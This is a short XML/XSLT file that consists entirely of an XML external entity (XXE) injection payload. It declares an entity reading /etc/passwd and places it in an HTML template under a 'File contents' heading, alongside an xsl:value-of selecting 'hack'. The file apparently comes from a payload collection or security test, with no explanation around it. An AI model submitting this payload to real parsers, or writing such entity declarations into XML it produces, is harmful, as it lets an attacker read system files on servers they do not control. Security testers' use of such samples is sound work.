<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE boom[<!ENTITY xxe SYSTEM "/etc/passwd">]>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<body>
<h1>RESULTS</h1>
<xsl:value-of select="hack"/>
<h2>File contents</h2>
<pre>&xxe;</pre>
</body>
</html>
